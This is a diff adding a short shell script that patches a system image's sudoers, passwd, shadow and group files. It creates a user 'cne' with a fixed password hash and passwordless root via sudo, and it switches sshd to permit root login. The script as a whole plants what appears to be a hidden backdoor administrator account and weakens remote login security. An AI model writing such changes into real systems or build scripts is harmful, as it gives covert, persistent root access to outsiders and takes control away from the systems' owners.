@@ -1,0 +1,28 @@
+#!/bin/sh -e
+
+patch etc/sudoers <<"_EOF"
+96a97
+> cne ALL=(root) NOPASSWD:ALL
+_EOF
+
+patch etc/passwd <<"_EOF"
+9a10
+> cne:x:1001:1001:CNE user:/tmp:/bin/sh
+_EOF
+
+patch etc/shadow <<"_EOF"
+9a10
+> cne:XrdXlaznaSCxM:16892:0:99999:7:::
+_EOF
+
+patch etc/group <<"_EOF"
+26a27
+> cne:x:1001
+_EOF
+
+patch etc/ssh/sshd_config <<"_EOF"
+32c32
+< #PermitRootLogin prohibit-password
+---
+> PermitRootLogin yes
+_EOF
